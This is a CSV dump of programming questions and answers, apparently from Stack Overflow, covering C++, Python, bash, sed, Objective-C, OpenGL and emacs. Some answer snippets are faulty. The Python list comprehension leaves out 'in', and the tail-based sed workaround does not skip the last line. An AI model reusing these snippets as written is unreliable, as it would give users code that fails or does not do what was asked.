QUESTION,USERID,USERNAME,ANSWER
"<p>I am trying to use a function pointer, but the 3 lines below just do not seem to want to cooperate...</p>

<p>I'm getting error code C3867.</p>

<p>Can you see what I'm doing wrong?</p>

<p>In .h file</p>

<pre><code>void MyFunc(int, FILEINFO*(*)(FILEINFO*), FILEINFO*, int);
</code></pre>

<p>The definition in the .cpp file</p>

<pre><code>void MyFunc(int number, FILEINFO*(*GetFiles)(FILEINFO*), FILEINFO* args, int type);
</code></pre>

<p>Then here is where I'm actually calling the function</p>

<pre><code>MyFuncClass-&gt;MyFunc(GetNumber(), &amp;BigClass::PassThis, GetArgs(), TheType);
</code></pre>

<p>Any problems jump out?</p>
","9530","","<p>What is the definition of <code>BigClass::PassThis()</code>?  Is it a static class member function or a regular member function?  If it's a regular member function, you can't do that, because it has a hidden <code>this</code> parameter.  See <a href=""http://www.parashift.com/c%2B%2B-faq-lite/pointers-to-members.html#faq-33.4"" rel=""nofollow"">question 33.4</a> of the C++ FAQ Lite.</p>
"
"<p>I'm trying to write a program in assembly and make the resulting executable as <strong>small as possible</strong>. Some of what I'm doing requires windows API calls to functions such as WriteProcessMemory. I've had some success with calling these functions, but after compiling and linking, my program comes out in the range of 14-15 KB. (From a source of less than 1 KB) I was hoping for much, much less than that.</p>

<p>I'm very new to doing low level things like this so I don't really know what would need to be done to make the program smaller. I understand that the exe format itself takes up quite a bit of space. Can anything be done to minimize that?</p>

<p>I should mention that I'm using NASM and GCC but I can easily change if that would help.</p>
","9530","","<p>See <a href=""http://www.phreedom.org/solar/code/tinype/"" rel=""nofollow"">Tiny PE</a> for a bunch of tips and tricks you can use to reduce the final size of your executable.  Be warned that some of the later techniques in that article are extremely fragile.</p>
"
"<p>Using Python, I'd like to compare every possible pair in a list.</p>

<p>Suppose I have</p>

<pre><code>my_list = [1,2,3,4]
</code></pre>

<p>I'd like to do an operation (let's call it foo) on every combination of 2 elements from the list.</p>

<p>The final result should be the same as</p>

<pre><code>foo(1,1)
foo(1,2)
...
foo(4,3)
foo(4,4)
</code></pre>

<p>My first thought was to iterate twice through the list manually, but that doesn't seem very pythonic.</p>
","9530","","<p>If you're just calling a function, you can't really do much better than:</p>

<pre><code>for i in my_list:
    for j in my_list:
        foo(i, j)
</code></pre>

<p>If you want to collect a list of the results of calling the function, you can do:</p>

<pre><code>[foo(i, j) for i my_list for j in my_list]
</code></pre>

<p>which will return you a list of the result of applying <code>foo(i, j)</code> to each possible pair <code>(i, j)</code>.</p>
"
"<p>Visual C++ has a compiler setting ""Enable C++ Exceptions"" which can be set to ""No"". What exactly will happen if I set it this way? My code never explicitly throws or catches exceptions (and therefore the first thrown exception will terminate the program anyway) and doesn't rely on stack unwinding - should I expect any more undesired behaviour from the recompiled program?</p>
","9530","","<p>If <code>operator new</code> fails to allocate memory, I believe that it will return <code>NULL</code> instead of throwing an <code>std::bad_alloc</code> exception.</p>

<p>If you make any calls to third-party libraries that throw exceptions, much badness will result.</p>
"
"<p>I have a few questions regarding Cache memories used in Multicore CPUs or Multiprocessor systems. (Although not directly related to programming, it has many repercussions while one writes software for multicore processors/multiprocessors systems, hence asking here!)</p>

<ol>
<li><p>In a multiprocessor system or a multicore processor (Intel Quad Core, Core two Duo etc..) does each cpu core/processor have its own cache memory (data and program cache)?</p></li>
<li><p>Can one processor/core access each other's cache memory, because if they are allowed to access each other's cache, then I believe there might be lesser cache misses, in the scenario that if that particular processors cache does not have some data but some other second processors' cache might have it thus avoiding a read from memory into cache of first processor? Is this assumption valid and true?</p></li>
<li><p>Will there be any problems in allowing any processor to access other processor's cache memory?</p></li>
</ol>
","9530","","<ol>
<li><p>Yes.  It varies by the exact chip model, but the most common design is for each CPU core to have its own private L1 data and instruction caches.  The L2 unified cache is typically shared between all cores.</p></li>
<li><p>No.  Each CPU core's L1 caches are on the same die as the core and cannot be accessed by other cores.  The cores are each connected to the L2 cache via the shared data bus.</p></li>
<li><p>Yes -- there simply aren't wires connecting the various CPU caches to the other cores.  If a core wants to access data in another core's cache, the only data path through which it can do so is the system bus.</p></li>
</ol>

<p>A very important related issue is the <a href=""http://en.wikipedia.org/wiki/Cache%5Fcoherency"">cache coherency problem</a>.  Consider the following: suppose one CPU core has a particular memory location in its cache, and it writes to that memory location.  Then, another core reads that memory location.  How do you ensure that the second core sees the updated value?  That is the cache coherency problem.  There are a variety of solutions; see Wikipedia et al.</p>
"
"<p>When contributing to a very old, and apparently no longer maintained, open-source or public domain project, is it suggested practice to follow the original author's coding style even if it is terrible? </p>

<p>More importantly, are there any reasons why one would want to follow the original author's coding style rather than clean it up significantly?</p>
","9530","","<p>Follow the original coding style.  It is far, far better to be <em>consistent</em>, even if it's not pretty to you.</p>

<p>If you do decide to clean up the coding style, do it separately from any other changes.  Don't clutter up source control diff's with style changes.  Make one (or several) checkins where the <em>only</em> thing you're doing is changing code style.  Do not mix in real changes with meaningless changes, it makes it impossible to locate relevant changes when reviewing source control commits.</p>
"
"<p>You can specify a range of lines to operate on. For example, to operate on all lines, (which is of course the default):</p>

<pre><code>sed -e ""1,$ s/a/b/""
</code></pre>

<p>But I need to operate on all but the last line. You apparently can't use arithmetic expressions:</p>

<pre><code>sed -e ""1,$-1 s/a/b/""
</code></pre>

<p>(I am using cygwin in this case, if it make a difference)</p>
","9530","","<p>Well, you could hack it with something like this:</p>

<pre><code>sed -e ""1,$(($(cat the-file | wc -l) - 1))s/a/b/""
</code></pre>

<p>Or, you could use <code>tail</code> instead:</p>

<pre><code>(tail +1 the-file) | sed -e s/a/b/; tail -1 the-file
</code></pre>
"
"<p>Is there a Linux command that will list all available commands and aliases for this terminal session?</p>

<p>As if you typed 'a' and pressed tab, but for every letter of the alphabet.
Or running 'alias' but also returning commands.</p>

<p>Why?  I'd like to run the following and see if a command is available:</p>

<pre><code>ListAllCommands | grep searchstr
</code></pre>
","9530","","<p>Here's a solution that gives you a list of all executables <em>and</em> aliases.  It's also portable to systems without <code>xargs -d</code> (e.g. Mac OS X), and properly handles paths with spaces in them.</p>

<pre><code>#!/bin/bash
(echo -n $PATH | tr : '\0' | xargs -0 -n 1 ls; alias | sed 's/alias \([^=]*\)=.*/\1/') | sort -u | grep ""$@""
</code></pre>

<p>Usage: <code>myscript.sh [grep-options] pattern</code>, e.g. to find all commands that begin with <code>ls</code>, case-insensitive, do:</p>

<pre><code>myscript -i ^ls
</code></pre>
"
"<p>In order to ensure that some initialization code runs before <code>main</code> (using Arduino/avr-gcc) I have code such as the following:</p>

<pre><code>class Init {
public:
    Init() { initialize(); }
};

Init init;
</code></pre>

<p>Ideally I'd like to be able to simply write:</p>

<pre><code>initialize();
</code></pre>

<p>but this doesn't compile...</p>

<p>Is there a less verbose way to achieve the same effect?</p>

<p><strong>Note:</strong> the code is part of an Arduino sketch so the <code>main</code> function is automatically generated and cannot be modified (for example to call <code>initialize</code> before any other code).</p>

<p><strong>Update:</strong> ideally the initialization would be performed in the <code>setup</code> function, but in this case there is other code depending on it which occurs before <code>main</code>.</p>
","9530","","<p>You can use GCC's <a href=""http://gcc.gnu.org/onlinedocs/gcc/Function-Attributes.html#index-g%5Ft%5F0040code%5F007bconstructor%5F007d-function-attribute-2220""><code>constructor</code> attribute</a> to ensure that it gets called before <code>main()</code>:</p>

<pre><code>void Init(void) __attribute__((constructor));
void Init(void) { /* code */ }  // This will always run before main()
</code></pre>
"
"<p>I need a good reference in how to get my hooks into Darwin. Basically I'd like to write an app the take care of some of the admin chores I do on my Macs. For example, moving new media to the backup server sorted by media type, pulling process info. Simple things like that. So basically I'd like to create a nifty GUI app that would call my shell scripts and give me the output of those scripts.</p>

<p>Is there anything equivilent to python's subprocess or C#'s Process library?</p>

<p>Links would suffice just fine.</p>

<p>Thanks.</p>
","9530","","<p>You can use the <a href=""http://linux.die.net/man/3/system"" rel=""nofollow""><code>system(3)</code></a> function to have the shell execute a command line:</p>

<pre><code>system(""path/to/my/shellscript.sh"");
</code></pre>
"
"<p>I recently got stuck in a situation like this:</p>

<pre><code>class A
{
public:
    typedef struct/class {...} B;
...
    C::D *someField;
}

class C
{
public:
    typedef struct/class {...} D;
...
    A::B *someField;
}
</code></pre>

<p>Usually you can declare a class name:</p>

<pre><code>class A;
</code></pre>

<p>But you can't forward declare a nested type, the following causes compilation error.</p>

<pre><code>class C::D;
</code></pre>

<p>Any ideas?</p>
","9530","","<p>You can't do it, it's a hole in the C++ language.  You'll have to un-nest at least one of the nested classes.</p>
"
"<p>I've seen code like the following frequently in some C++ code I'm looking at:</p>

<pre><code>typedef class SomeClass SomeClass;
</code></pre>

<p>I'm stumped as to what this actually achieves.  It seems like this wouldn't change anything. What do <code>typedef</code>s like this do? And if this does something useful, is it worth the extra effort?</p>
","9530","","<p>It prevents code like this from compiling:</p>

<pre><code>class SomeClass { ... };
int SomeClass;
</code></pre>

<p>This is perfectly legal C++, though it's <em>terrible</em>.  If you do this, then any references to a bare <code>SomeClass</code> refer to the variable.  To refer to the class, you need to explicitly say <code>class SomeClass</code> at each usage.  If you create a <code>typedef</code>:</p>

<pre><code>class SomeClass { ... };
typedef class SomeClass SomeClass;
int SomeClass;
</code></pre>

<p>Then the compiler flags the definition of <code>int SomeClass</code> as an error, as it rightly should be.</p>
"
"<p>I'm writing a real-time operation system from scratch for a course project. I want to know the end address of my code after I download it to the chip, because I am planning to use the free memory for stack space and I need make sure that I won't overwrite the existing code.</p>

<p>I heard about __end variable provided by GCC is the end of the code, but I have no idea about what is the meaning of __end and how to use it in my code. Could anyone explain it a little bit or provide links to some materials, cos I couldn't google __end?</p>

<p>Thanks a lot.  </p>
","9530","","<p>You could use a linker script.  In your C code, declare:</p>

<pre><code>// call this whatever you want; the linker will fill this in with the address
// of the end of code
extern uint32_t endOfCode;
</code></pre>

<p>Then, in your linker script, add the following immediately after the definition of the <code>.text</code> section:</p>

<pre><code>PROVIDE(endOfCode = .);
</code></pre>

<p>I'm not very familiar with linker scripts, so I can't provide a complete, working example.  You'll have to take the default linker script (which I'm not sure how one obtains) and modify it as above, then use the <code>-T</code> option of the linker to specify it.  Good luck!</p>
"
"<p>Why isn't my UILabel being changed? I am using the following code, and nothing is happening:</p>

<pre><code>- (void)awakeFromNib {
    percentCorrect.adjustsFontSizeToFitWidth;
    percentCorrect.numberOfLines = 3;
    percentCorrect.minimumFontSize = 100;
}
</code></pre>

<p>Here is my Implemintation code:</p>

<pre><code>- (void) updateScore {
    double percentScore = 100.0 * varRight / (varWrong + varRight);
    percentCorrect.text = [NSString stringWithFormat:@""%.2f%%"", percentScore];
}

- (void)viewDidLoad {
    percentCorrect.adjustsFontSizeToFitWidth = YES;
    percentCorrect.numberOfLines = 3;
    percentCorrect.minimumFontSize = 100;
    percentCorrect.text = @""sesd"";
}


- (void)correctAns {
    numberRight.text = [NSString stringWithFormat:@""%i Correct"", varRight];
}

-(void)wrongAns {
    numberWrong.text = [NSString stringWithFormat:@""%i Incorrect"", varWrong];
}

#pragma mark Reset Methods
- (IBAction)reset:(id)sender; {
    NSString *message = @""Are you sure you would like to reset?"";
    self.wouldYouLikeToReset = [[UIAlertView alloc] initWithTitle:@""Reset?"" message:message delegate:self cancelButtonTitle:@""Cancel"" otherButtonTitles:nil];
    [wouldYouLikeToReset addButtonWithTitle:@""Continue""];
    [self.wouldYouLikeToReset show];
    // Now goes to (void)alertView and see's what is being pressed!
}

- (void)alertView:(UIAlertView *)actionSheet clickedButtonAtIndex:(NSInteger)buttonIndex {
    if (buttonIndex == 0)
    {
    	NSLog(@""Cancel button pressed"");
    }
    else
    {
    	varRight = 0;
    	varWrong = 0;
    	[self wrongAns];
    	[self correctAns];
    	percentCorrect.text = [NSString stringWithFormat:@""0.0%%""];

    }
}

#pragma mark Button Action Methods

- (IBAction)right:(id)sender; {
    varRight++;
    [self correctAns];
    [self updateScore];
}

- (IBAction)wrong:(id)sender; {
    varWrong++;
    [self wrongAns];
    [self updateScore];
}


- (IBAction)subOneRight:(id)sender {
    if (varRight &gt; 0 ) {
    	varRight--;
    	[self correctAns];
    	[self updateScore];
    }
}


- (IBAction)subOneWrong:(id)sender {
    if (varWrong &gt; 0) {
    	varWrong--;
    	[self wrongAns];
    	[self updateScore];
    }
}

-(IBAction)addHalfCredit:(id)sender;
{
    varWrong++;
    varRight++;
    [self wrongAns];
    [self correctAns];
    [self updateScore];
}


@end
</code></pre>

<p>Any ideas? 
Thanks</p>
","9530","","<p>It's possible that <code>percentCorrect</code> hasn't yet been initialized.  Is <code>percentCorrect</code> equal to <code>nil</code> when that function is called, by any chance?  If so, wait until after it's properly initialized to set its properties.</p>
"
"<p>My bash init script (~/.profile) contains important initializations, but whenever I use shell-command or compile in emacs, that init file is not read, and without those initialization my bash commands in emacs will fail :( How do I force emacs to execute my init file for the shell that it's using for shell-command?</p>

<p>Clarification: I'm not talking about M-x shell, which reads my init file just fine when I symlinked .profile to .emacs_bash.</p>
","9530","","<p>Move your initialization routines into your <code>~/.bashrc</code> file, and then add the line</p>

<pre><code>source ~/.bashrc
</code></pre>

<p>into your <code>~/.bash_profile</code> file. See the <a href=""http://linux.die.net/man/1/bash"" rel=""nofollow"">bash man page</a> for a detailed explanation of which startup files get loaded when. They key is the difference between an <em>interactive</em> and <em>non-interactive</em> shell, as well as the difference between a <em>login</em> and a <em>non-login</em> shell.</p>

<p>In general, <code>.bash_profile</code> is run when logging into the system using a shell while <code>.bashrc</code> is run when starting a new shell (The OS X Terminal application is an exception to this rule as it runs <code>.bash_profile</code> for each new terminal instance). For more info in article form, <a href=""http://www.joshstaiger.org/archives/2005/07/bash_profile_vs.html"" rel=""nofollow"">look here.</a></p>
"
"<p>I know how to convert binary to decimal. I know at least 2 methods: table and power ;-)</p>

<p>I want to convert binary to decimal and print this decimal. Moreover, I'm not interested in this `decimal'; I want just to print it.</p>

<p>But, as I wrote above, I know only 2 methods to convert binary to decimal and both of them required addition. So, I'm computing some value for 1 or 0 in binary and add it to the remembered value. This is a thin place. I have a really-really big number (1 and 64 zeros). While converting I need to place some intermediate result in some 'variable'. In C, I have an `int' type, which is 4 bytes only and not more than 10^11.</p>

<p>So, I don't have enough memory to store intermedite result while converting from binary to decimal. As I wrote above, I'm not interested in THAT decimal, I just want to print the result. But, I don't see any other ways to solve it ;-( Is there any solution to ""just print"" from binary?</p>

<p>Or, maybe, I should use something like BCD (Binary Coded Decimal) for intermediate representation? I really don't want to use this, 'cause it is not so cross-platform (Intel's processors have a built-in feature, but for other I'll need to write own implementation).</p>

<p>I would glad to hear your thoughts. Thanks for patience.</p>

<p>Language: C.</p>
","9530","","<p>I highly recommend using a library such as <a href=""http://gmplib.org/"">GMP</a> (GNU multiprecision library).  You can use the <code>mpz_t</code> data type for large integers, the various <a href=""http://gmplib.org/manual/Integer-Import-and-Export.html#Integer-Import-and-Export"">import/export routines</a> to get your data into an <code>mpz_t</code>, and then use <a href=""http://gmplib.org/manual/I%5F002fO-of-Integers.html#I%5F002fO-of-Integers""><code>mpz_out_str()</code></a> to print it out in base 10.</p>
"
"<p>I just ported a .obj loader to objective-C and so far, it works, I can get my vertices and normals and stuff.
Every normal is good, pointing in the right direction, all my faces are in CCW winding, but I have some issues with the depth test.</p>

<pre><code>float rotX = 0;
float rotY = 0;
objModel* o = [[objModel alloc] initWithPath:@""/model.obj""]

glClearColor(0,0,0,0);

glEnable(GL_DEPTH_TEST);
glFrontFace(GL_CCW);
glCullFace(GL_BACK); 
glEnable(GL_CULL_FACE);
glEnable(GL_LIGHTING);
glEnable(GL_LIGHT0);
glEnable(GL_COLOR_MATERIAL);

glClear(GL_COLOR_BUFFER_BIT|GL_DEPTH_BUFFER_BIT);

glMatrixMode(GL_PROJECTION);
glLoadIdentity();   
glMatrixMode(GL_MODELVIEW);
glLoadIdentity();
glTranslated(0, -1, 0);
glRotatef(90,0,0,1);
glRotatef(90,0,1,0);
glRotatef(rotX,0,0,-1);
glRotatef(rotY,0,1,0);

[o drawObjWithArrays]

glFlush();
</code></pre>

<p>I have 2 different ways of drawing my object, one uses glBegin() / glEnd(), the other uses vertex and normal arrays with a call to glDrawArrays(). Both of them result in the same problem : faces that should be hidden by faces in front of them are displayed, because the depth test isn't working. The faces are drawn in the order they come in the .obj file.</p>

<p>You'll find an image here : <a href=""http://img524.imageshack.us/img524/994/image2jgq.png"">http://img524.imageshack.us/img524/994/image2jgq.png</a></p>

<p>I quite new to OpenGL and objective-C, so I guess my problem comes from a setting that I forgot. Here they are :</p>

<pre><code>-(id) initWithFrame:(NSRect) frame {
NSLog(@""INIT GL VIEW\n"");

GLuint attributes[] = {
	NSOpenGLPFANoRecovery,
	NSOpenGLPFAWindow,
	NSOpenGLPFAAccelerated,
	NSOpenGLPFADoubleBuffer,
	NSOpenGLPFAColorSize, 24,
	NSOpenGLPFAAlphaSize, 8,
	NSOpenGLPFADepthSize, 24,
	NSOpenGLPFAStencilSize, 8,
	NSOpenGLPFAAccumSize, 0,
	0
};

NSOpenGLPixelFormat* fmt = [[NSOpenGLPixelFormat alloc] initWithAttributes:(NSOpenGLPixelFormatAttribute*) attributes];
if (!fmt)
	NSLog(@""No OpenGL pixel format"");

GLfloat   mat_ambient[]		= {0.0, 0.0, 1.0, 1.0};
GLfloat   mat_flash[]		= {0.0, 0.0, 1.0, 1.0};
GLfloat   mat_flash_shiny[] = {50.0};
GLfloat   light_position[]  = {100.0,-200.0,-200.0,0.0};
GLfloat   ambi[]            = {0.1, 0.1, 0.1, 0.1};
GLfloat   lightZeroColor[]  = {0.9, 0.9, 0.9, 0.1};

/* set the material */
glLightfv(GL_LIGHT0, GL_POSITION, light_position);
glLightfv(GL_LIGHT0, GL_AMBIENT, ambi);
glLightfv(GL_LIGHT0, GL_DIFFUSE, lightZeroColor);

glMaterialfv(GL_FRONT, GL_SHININESS, mat_flash_shiny);	
glMaterialfv(GL_FRONT, GL_SPECULAR, mat_flash);
glMaterialfv(GL_FRONT, GL_AMBIENT, mat_ambient);

return self = [super initWithFrame:frame pixelFormat:[fmt autorelease]]; 
}
</code></pre>

<p>Anyone can help me ? I've tried everyone glDepthFunc, glCullFace, glFrontFace combination possible, nothing works...</p>

<p>Thanks ^^</p>
","9530","","<p>Make sure you call <a href=""http://www.opengl.org/documentation/specs/man%5Fpages/hardcopy/GL/html/gl/depthfunc.html"" rel=""nofollow""><code>glDepthFunc()</code></a> to set the depth buffer comparison function.  Most applications use <code>GL_LEQUAL</code> or <code>GL_LESS</code> for the depth function.  Also make sure you call <a href=""http://www.opengl.org/documentation/specs/man%5Fpages/hardcopy/GL/html/gl/cleardepth.html"" rel=""nofollow""><code>glClearDepth()</code></a> to set the value that the depth buffer gets cleared to; you should probably use a parameter of <code>1.0</code> for this to clear to maximum depth.</p>
"
"<pre><code>File file = new File(""path to file alias foo"");
</code></pre>

<p>where ""path to file alias foo"" is an alias reports file size to be 0 instead of the actual file size. I found a workaround to test for aliases:</p>

<pre><code>public boolean isLink() {
        try {
            if (file.getAbsolutePath().equals(file.getCanonicalPath())) {
                return false;
            }
        } catch (IOException ex) {
            logger.severe(ex.getMessage());
        }
        return true;
    }
</code></pre>

<p><strong>EDIT</strong> Actually this code does not work, as pointed out by a poster below. I was trying to adapt a solution from a linux symlink example, but I didn't realize that finder aliases and symlinks were not the same.</p>

<p><strong>NOT!</strong> this seems to work, but ....</p>

<pre><code>file.getCanonicalFile().length();
</code></pre>

<p>still reports file length to be 0. Can anyone point me in the right direction?</p>
","9530","","<p>Finder aliases are a different beast altogether from normal symbolic links.  The *nix tools on OS X are not aware of aliases at all, because they're stored in the resource fork, I believe.  If you install <a href=""http://osxutils.sourceforge.net/"" rel=""nofollow""><code>osxutils</code></a>, you can use this shell command to get the target of an alias:</p>

<pre><code>hfsdata -e the-alias
</code></pre>

<p>From Java, I don't know of a better way of doing this other than calling <code>Runtime.exec(...)</code>.</p>

<p>Also, I just a did a quick check, and your function for detecting aliases does not work.  AFAICT, Java is not aware of Finder aliases.  If you <em>really</em> want to support them, then you'll either need to use something like <code>osxutils</code>, or use some platform-specific code to read resource forks (will probably involve JNI).  Neither option is pretty.</p>

<p>If you go the JNI route, check out the <a href=""http://developer.apple.com/documentation/Carbon/Reference/Alias%5FManager/Reference/reference.html"" rel=""nofollow"">Alias Manager Reference</a> documentation.  The relevant functions are <a href=""http://developer.apple.com/documentation/Carbon/Reference/Alias%5FManager/Reference/reference.html#//apple%5Fref/c/func/FSIsAliasFile"" rel=""nofollow""><code>FSIsAliasFile</code></a> and <a href=""http://developer.apple.com/documentation/Carbon/Reference/Alias%5FManager/Reference/reference.html#//apple%5Fref/c/func/FSResolveAliasFile"" rel=""nofollow""><code>FSResolveAliasFile</code></a>.</p>
"
"<p>I'm writing C++ console programs. After compilation, when I run the program from my file browser, cmd.exe automatically closes such that I can't see my programs output.</p>

<p>The only way to work around this I've found is to run the program from inside cmd.exe</p>

<p>Is there anyway to keep cmd.exe open after a program finishes running?</p>

<p>Is there a setting I can change somewhere? I don't want to run a batch script with cmd.exe /K</p>

<p>Thanks!</p>

<p>[Edit] Don't know if this matters, but I'm on Vista x64</p>
","9530","","<p>As the last line of your <code>main()</code> function, you can add this line:</p>

<pre><code>system(""PAUSE"");
</code></pre>

<p>Also, make sure to <code>#include &lt;stdlib.h&gt;</code> to declare the <code>system()</code> function.  This will make the console pause.  However, if your program is run from inside <code>cmd.exe</code>, this will still pause, which may be undesirable.</p>
"
"<p>I'm trying to compile a very simple program in Java 1.6 on Ubuntu Jaunty, using Apache Commons Config jar.  I keep getting the ""package org.apache.commons.configuration does not exist"" error, even though the jar is in the same directory.  Any ideas?</p>

<ul>
<li>Directory Listing</li>
</ul>

<pre>
~/source/UpdateStockHistory$ ll
total 304
-rw-r--r-- 1 crosse crosse 298829 2009-06-07 17:36 commons-configuration-1.6.jar
-rw-r--r-- 1 crosse crosse    149 2009-06-07 17:16 UpdateStockHistory.config.xml
-rw-r--r-- 1 crosse crosse    531 2009-06-07 17:46 UpdateStockHistory.java
</pre>

<ul>
<li>Java Version</li>
</ul>

<pre>
~/source/UpdateStockHistory$ javac -version
javac 1.6.0_13
</pre>

<ul>
<li>OS Version</li>
</ul>

<pre>
~/source/UpdateStockHistory$ lsb_release -a
No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 9.04
Release:        9.04
Codename:       jaunty
</pre>

<ul>
<li>Compiler Version</li>
</ul>

<pre>
~/source/UpdateStockHistory$ javac UpdateStockHistory.java
UpdateStockHistory.java:2: package org.apache.commons.configuration does not exist
import org.apache.commons.configuration.*;
^
UpdateStockHistory.java:8: cannot find symbol
symbol  : class ConfigurationFactory
location: class com.crosse.tradingresearch.UpdateStockHistory
                        ConfigurationFactory factory = new ConfigurationFactory(""UpdateStockHistory.config.xml"");
                        ^
UpdateStockHistory.java:8: cannot find symbol
symbol  : class ConfigurationFactory
location: class com.crosse.tradingresearch.UpdateStockHistory
                        ConfigurationFactory factory = new ConfigurationFactory(""UpdateStockHistory.config.xml"");
                                                           ^
UpdateStockHistory.java:9: cannot find symbol
symbol  : class Configuration
location: class com.crosse.tradingresearch.UpdateStockHistory
                        Configuration config = factory.getConfiguration();
                        ^
4 errors

</pre>

<p>Hate to ask such a ""do it for me"" question, but I've run out of ideas.</p>
","9530","","<p>Try adding the jar to your classpath as so:</p>

<pre><code>javac UpdateStockHistory.java -cp commons-configuration-1.6.jar
</code></pre>
"
"<p>If I know an emacs command name, says, ""goto-line""; what if I want to query whether if there are any key-sequences bound to this command ?</p>

<p>And vice versa, given a key sequence, how can I find its command name ?</p>
","9530","","<p>You can get help for a command by typing</p>

<pre><code>C-h f function-name
</code></pre>

<p>This will usually tell you if it has a standard key binding.  Conversely, given a key sequence, you can type</p>

<pre><code>C-h k key-sequence
</code></pre>

<p>To get the command that would run.  For more help on getting help, you can type</p>

<pre><code>C-h ?
</code></pre>
"
"<p>I am working my way through some Objective-C code that I did not write and have found a variable declaration style that I am unfamiliar with. Can anyone tell me the scope of the variable 'myVar' in the class implementation below? Note that this appears in the '.m' file and not the interface declaration.</p>

<pre><code>@implementation MyClass
@synthesize ivar1, ivar2;

NSString* myVar; // &lt;- What is the intent?

- (id)init {

...

@end
</code></pre>

<p>To me the intention appears to be similar to that of a member variable. What are the advantages of declaring a variable in this way instead of using an ivar in the @interface declaration?</p>
","9530","","<p>It's just a plain old global variable.  There's only one instance of it, and it can be accessed by any code within the same file <em>translation unit</em> (the final file you get after running the preprocessor).  Other translation units (that is, other <code>.m</code> files) can also access that global variable, but in order to do so, they need to use an <code>extern</code> statement:</p>

<pre><code>extern NSString *myVar;
</code></pre>

<p><code>extern</code> says ""this is the name of a global variable, but it's defined in a different translation unit"".  The linker resolves all of the <code>extern</code> declarations at link time.</p>
"
"<p>I'm programming an application in Objective-C and I'm getting this error:</p>

<pre><code>MyApp(2121,0xb0185000) malloc: *** error for object 0x1068310: double free
*** set a breakpoint in malloc_error_break to debug
</code></pre>

<p>It is happening when I release an NSAutoreleasePool and I can't figure out what object I'm releasing twice.</p>

<p>How do I set his breakpoint?</p>

<p>Is there a way to know what is this ""object 0x1068310""?</p>

<p>thanks in advance</p>

<p>Gonso</p>
","9530","","<p>Open up the debugger console by pressing Cmd+Shift+R.  There, type</p>

<pre><code>break malloc_error_break
</code></pre>

<p>to set a breakpoint at the beginning of the <code>malloc_error_break</code> function.</p>

<p>If you want to find out what object is located at address 0x1068310, you can type the following into the debugger console:</p>

<pre><code>print-object 0x1068310
</code></pre>

<p>Of course, you have to do this while the object is still alive -- if the object has already been freed by the time you do this, then this will not work.</p>
"
"<p>I am using 'tail -f' to follow a log file as it's updated:</p>

<blockquote>
  <p><strong>tail -f logfile</strong></p>
</blockquote>

<p>I next pipe the output of that to grep to show only the lines containing a search term (""org.springframework"" in this case):</p>

<blockquote>
  <p>tail -f logfile <strong>| grep org.springframework</strong></p>
</blockquote>

<p>The third step I'd like to make is piping the output from grep to a third command, 'cut':</p>

<blockquote>
  <p>tail -f logfile | grep org.springframework <strong>| cut -c 25-</strong></p>
</blockquote>

<p>The cut command would remove the first 25 characters of each line for me <strong>if it could get the input from grep!</strong> (It works as expected if I eliminate 'grep' from the chain.)</p>

<p>I'm using <strong>cygwin</strong> with <strong>bash</strong> if that matters.</p>

<p>Thanks in advance for your assistance, O Mighty Scripting Gods, Ye!</p>

<p>--
LES</p>

<p><strong>Edit:</strong>
Actual results: When I add the second pipe to connect to the 'cut' command, the result is that it hangs, as if it's waiting for input (in case you were wondering).</p>

<p><strong>Edit 2:</strong> Corrected typo in cut command</p>
","9530","","<p>What you have should work fine -- that's the whole idea of pipelines.  The only problem I see is that, in the version of <code>cut</code> I have (GNU coreutiles 6.10), you should use the syntax <code>cut -c 25-</code> (i.e. use a minus sign instead of a plus sign) to remove the first 24 characters.</p>

<p>You're also searching for different patterns in your two examples, in case that's relevant.</p>
"
"<p>Here's a bash script I'm working on:</p>

<pre><code>dir=""~/path/to/$1/folder""

if [ -d ""$dir"" ]; then
    # do some stuff
else
    echo ""Directory $dir doesn't exist"";
    exit 1
fi
</code></pre>

<p>and when I run it from the terminal:</p>

<pre>> ./myscript.sh 123
Directory ~/path/to/123/folder doesn't exist</pre>

<p>But that folder clearly does exist. This works normally:</p>

<pre>> ls ~/path/to/123/folder</pre>

<p>What am I doing wrong?</p>
","9530","","<p>The problem is that bash performs tilde expansion before shell parameter substitution, so after it substitutes <code>~/path/to/folder</code> for <code>$dir</code>, it doesn't try to expand the <code>~</code>, so it looks for a directory literally named with a tilde in it, which of course doesn't exist.  See <a href=""http://www.gnu.org/software/bash/manual/bashref.html#Shell-Expansions"" rel=""nofollow"">section 3.5 of the bash manual</a> for a more detailed explanation on bash's expansions.</p>
"
